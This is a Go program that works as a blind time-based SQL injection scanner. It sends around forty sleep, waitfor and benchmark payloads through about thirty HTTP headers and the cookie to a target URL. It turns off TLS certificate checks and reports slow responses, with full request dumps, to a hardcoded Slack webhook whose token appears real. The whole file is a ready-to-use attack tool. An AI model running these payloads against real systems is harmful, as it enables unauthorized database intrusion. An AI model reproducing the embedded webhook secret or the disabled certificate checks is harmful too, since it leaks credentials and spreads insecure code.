package main

import (
    "fmt"
    "os"
//    "net/url"
    "net/http"
    "log"
    "net/http/httputil"
//    "io/ioutil"
//    "strings"
    "time"
    "crypto/tls"
//    "bufio"
    "bytes"
    "encoding/json"
    "errors"


)

type SlackRequestBody struct {
    Text string `json:"text"`
}

func SendSlackNotification(webhookUrl string, msg string) error {

    slackBody, _ := json.Marshal(SlackRequestBody{Text: msg})
    req, err := http.NewRequest(http.MethodPost, webhookUrl, bytes.NewBuffer(slackBody))
    if err != nil {
        return err
    }

    req.Header.Add("Content-Type", "application/json")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(resp.Body)
    if buf.String() != "ok" {
        return errors.New("Non-ok response returned from Slack")
    }
    return nil
}

func sqli(url1,server,cookie1 string) {
         webhookUrl := "https://hooks.slack.com/services/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"        
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Proxy-Host", server)
         req.Header.Add("Request-Uri", server)
         req.Header.Add("X-Forwarded", server)
         req.Header.Add("X-Forwarded-By", server)
         req.Header.Add("X-Forwarded-For", server)
         req.Header.Add("X-Forwarded-For-Original", server)
         req.Header.Add("X-Forwarded-Host", server)
         req.Header.Add("X-Forwarded-Server", server)
         req.Header.Add("X-Forwarder-For", server)
         req.Header.Add("X-Forward-For", server)
         req.Header.Add("Base-Url", server)
         req.Header.Add("Http-Url", server)
         req.Header.Add("Proxy-Url", server)
         req.Header.Add("Redirect", server)
         req.Header.Add("Real-Ip", server)
         req.Header.Add("Referer", server)
         req.Header.Add("Referrer", server)
         req.Header.Add("Refferer", server)
         req.Header.Add("Uri", server)
         req.Header.Add("Url", server)
         req.Header.Add("X-Host", server)
         req.Header.Add("X-Http-Destinationurl", server)
         req.Header.Add("X-Http-Host-Override", server)
         req.Header.Add("X-Original-Remote-Addr", server)
         req.Header.Add("X-Original-Url", server)
         req.Header.Add("X-Proxy-Url", server)
         req.Header.Add("X-Rewrite-Url", server)
         req.Header.Add("X-Real-Ip", server)
         req.Header.Add("X-Remote-Addr", server)
         req.Header.Add("User-Agent", server)
         req.Header.Add("Cookie", cookie1)
         req.Header.Add("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
         req.Header.Add("Accept-Language","en-US,en;q=0.5")
         req.Header.Add("Accept-Encoding","gzip, deflate") 

         start := time.Now()
         res, err := client.Do(req)

         if err != nil{
               log.Fatal(err)
         }
         elapsed := time.Since(start).Seconds()
         fmt.Printf("http.Get to %s took %v seconds with status %z \n", url1, elapsed,res.StatusCode)
 
         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
              fmt.Println(err)
         }
         fmt.Println(string(requestDump))
         fmt.Println(res.StatusCode)
         if elapsed >= 15 && elapsed <=17{
            text:=fmt.Sprintf("probable SQLI on %s took %v seconds \n %v", url1, elapsed,string(requestDump))
            SendSlackNotification(webhookUrl,text)
          

        }
//         reqBody, err := ioutil.ReadAll(res.Body)
//         if err != nil {
//                          log.Fatal(err)
//         }
//         fmt.Printf("%s", reqBody)


}

func main() {

              payloads := []string{"sleep(15)#","1 or sleep(15)#","\" or sleep(15)#","' or sleep(15)#","\" or sleep(15)=\"", "' or sleep(15)='", "1) or sleep(15)#", "\") or sleep(15)=\"", "') or sleep(15)='", "1)) or sleep(15)#", "\")) or sleep(15)=\"", "')) or sleep(15)='", ";waitfor delay '0:0:15'--", ");waitfor delay '0:0:15'--", "';waitfor delay '0:0:15'--", "\";waitfor delay '0:0:15'--", "');waitfor delay '0:0:15'--", "\");waitfor delay '0:0:15'--", "));waitfor delay '0:0:15'--", "'));waitfor delay '0:0:15'--", "\"));waitfor delay '0:0:15'--", "benchmark(10000000,MD5(1))#", "1 or benchmark(10000000,MD5(1))#", "\" or benchmark(10000000,MD5(1))#", "' or benchmark(10000000,MD5(1))#", "1) or benchmark(10000000,MD5(1))#", "\") or benchmark(10000000,MD5(1))#", "') or benchmark(10000000,MD5(1))#", "1)) or benchmark(10000000,MD5(1))#","\")) or benchmark(10000000,MD5(1))#", "')) or benchmark(10000000,MD5(1))#", "pg_sleep(15)--", "1 or pg_sleep(15)--", "\" or pg_sleep(15)--", "' or pg_sleep(15)--", "1) or pg_sleep(15)--", "\") or pg_sleep(15)--", "') or pg_sleep(15)--", "1)) or pg_sleep(15)--", "\")) or pg_sleep(15)--", "')) or pg_sleep(15)--"}


//              file, err := os.Open(os.Args[1])
//              if err != nil {
//                 log.Fatal(err)
//              }
//              defer file.Close()
//              scanner := bufio.NewScanner(file)
//              for scanner.Scan() {
              str := os.Args[1]
              for _, payload := range payloads {
                      sql_test := payload 
                      cookie:=os.Args[2]
                      if cookie == "1" {
                           sqli(str,sql_test,payload)
                      }else{
                           sqli(str,sql_test,os.Args[2])
                      }
              }



}
